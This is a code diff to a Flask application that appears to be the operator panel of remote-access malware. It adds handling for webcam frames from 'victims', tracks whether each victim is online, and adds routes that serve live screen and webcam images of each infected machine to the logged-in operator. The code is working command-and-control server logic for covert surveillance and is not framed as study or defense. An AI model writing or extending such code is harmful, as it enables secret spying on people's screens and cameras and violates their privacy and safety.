@@ -532,7 +532,7 @@ def api_report(panel_id):
 
 @app.route('/api/<panel_id>/screen/<victim_id>', methods=['POST'])
 def api_screen(panel_id, victim_id):
-    """Receive live screenshot"""
+    """Receive live screenshot or webcam"""
     user = User.query.filter_by(panel_id=panel_id).first()
     if not user:
         return jsonify({'error': 'Invalid'}), 404
@@ -544,17 +544,63 @@ def api_screen(panel_id, victim_id):
     try:
         if request.is_json and request.json.get('screenshot_base64'):
             screenshot_data = base64.b64decode(request.json['screenshot_base64'])
-            filename = f"{victim_id}_live.png"
+            frame_type = request.json.get('type', 'screen')
+
+            if frame_type == 'webcam':
+                filename = f"{victim_id}_webcam.jpg"
+            else:
+                filename = f"{victim_id}_live.jpg"
+
             filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
             with open(filepath, 'wb') as f:
                 f.write(screenshot_data)
-            victim.screenshot_path = filename
+
+            if frame_type == 'screen':
+                victim.screenshot_path = filename
+
             victim.last_seen = datetime.utcnow()
+            victim.is_online = True
             db.session.commit()
 
         return jsonify({'success': True}), 200
     except:
         return jsonify({'error': 'Failed'}), 500
+
+
+@app.route('/api/live/<victim_id>/screen')
+@login_required
+def get_live_screen(victim_id):
+    """Get latest screenshot for live view"""
+    victim = Victim.query.filter_by(victim_id=victim_id).first()
+    if not victim or victim.user_id != session['user_id']:
+        return jsonify({'error': 'Invalid'}), 404
+
+    filename = f"{victim_id}_live.jpg"
+    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+
+    if os.path.exists(filepath):
+        with open(filepath, 'rb') as f:
+            img_data = base64.b64encode(f.read()).decode('utf-8')
+        return jsonify({'image': img_data, 'timestamp': os.path.getmtime(filepath)})
+    return jsonify({'error': 'No image'}), 404
+
+
+@app.route('/api/live/<victim_id>/webcam')
+@login_required
+def get_live_webcam(victim_id):
+    """Get latest webcam frame"""
+    victim = Victim.query.filter_by(victim_id=victim_id).first()
+    if not victim or victim.user_id != session['user_id']:
+        return jsonify({'error': 'Invalid'}), 404
+
+    filename = f"{victim_id}_webcam.jpg"
+    filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
+
+    if os.path.exists(filepath):
+        with open(filepath, 'rb') as f:
+            img_data = base64.b64encode(f.read()).decode('utf-8')
+        return jsonify({'image': img_data, 'timestamp': os.path.getmtime(filepath)})
+    return jsonify({'error': 'No webcam'}), 404
 
 
 @app.route('/api/<panel_id>/file/<filename>')
